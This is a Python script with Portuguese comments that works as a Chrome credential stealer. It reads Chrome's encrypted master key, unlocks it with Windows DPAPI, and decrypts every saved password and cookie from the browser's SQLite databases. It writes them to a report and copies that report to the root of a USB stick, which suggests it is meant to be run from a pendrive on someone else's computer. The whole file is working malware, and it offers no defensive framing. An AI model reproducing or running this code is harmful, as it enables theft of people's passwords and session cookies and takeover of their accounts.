import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# ============================================================
# 1. CRIA A PASTA E O LOG IMEDIATAMENTE (MESMO SE DER ERRO)
# ============================================================
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
try:
    os.makedirs(PASTA_SAIDA, exist_ok=True)
except:
    # Fallback: área de trabalho
    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:/'), 'Desktop')
    PASTA_SAIDA = os.path.join(desktop, "Credenciais_Backup")
    os.makedirs(PASTA_SAIDA, exist_ok=True)

# ARQUIVO DE LOG (já escreve o início)
LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(str(texto) + "\n")
    print(texto)  # também imprime no console (se houver)

log("="*60)
log("INICIANDO COLETA (VERSÃO ROBUSTA)")
log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
log(f"Usuário: {os.getlogin()}")
log(f"Pasta de saída: {PASTA_SAIDA}")
log("="*60)

# ============================================================
# 2. FUNÇÕES DE COLETA (COM TRATAMENTO DE ERRO)
# ============================================================
def pegar_chave_mestra():
    path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Local State"
    if not os.path.exists(path):
        raise FileNotFoundError(f"Chrome não encontrado: {path}")
    with open(path, 'r', encoding='utf-8') as f:
        local = json.load(f)
    chave_enc = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]

def coletar_senhas(chave):
    log("  Coletando senhas...")
    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        return ["Chrome não possui dados de login."]
    temp = os.path.join(PASTA_SAIDA, "temp_senhas.db")
    shutil.copyfile(caminho, temp)
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except Exception as e:
            log(f"    Erro ao descriptografar: {e}")
    conn.close()
    os.remove(temp)
    log(f"    OK {len(creds)} senhas.")
    return creds

def coletar_cookies(chave):
    log("  Coletando cookies...")
    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "temp_cookies.db")
    shutil.copyfile(caminho, temp)
    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host, nome, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(cookies)} cookies.")
    return cookies

# ============================================================
# 3. MAIN (COM CAPTURA DE ERRO GLOBAL)
# ============================================================
try:
    log("\n[+] Obtendo chave...")
    chave = pegar_chave_mestra()
    log("[OK] Chave obtida.")

    log("\n[+] Coletando dados...")
    dados = {
        "senhas": coletar_senhas(chave),
        "cookies": coletar_cookies(chave)
    }

    # Salva relatório
    nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    caminho = os.path.join(PASTA_SAIDA, nome)
    with open(caminho, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("RELATORIO COMPLETO\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Usuario: {os.getlogin()}\n")
        f.write("="*80 + "\n\n")
        for secao, itens in dados.items():
            f.write(f"[{secao.upper()}]\n")
            f.write("-"*40 + "\n")
            if itens:
                for item in itens:
                    f.write(item + "\n")
            else:
                f.write("Nenhum dado encontrado.\n")
            f.write("\n")

    # Cópia na raiz do pendrive
    try:
        shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
        log(f"\n[OK] Relatório salvo em: {caminho}")
        log(f"[OK] Cópia na raiz do pendrive: {nome}")
    except Exception as e:
        log(f"[AVISO] Não foi possível copiar para a raiz: {e}")

except Exception as e:
    log(f"[ERRO FATAL] {e}")
    import traceback
    log(traceback.format_exc())
    # Cria um arquivo de erro para diagnóstico
    with open(os.path.join(PASTA_SAIDA, "erro.txt"), "w") as f:
        f.write(str(e) + "\n" + traceback.format_exc())

finally:
    log("\n" + "="*60)
    log("FIM DA EXECUÇÃO")
    time.sleep(2)
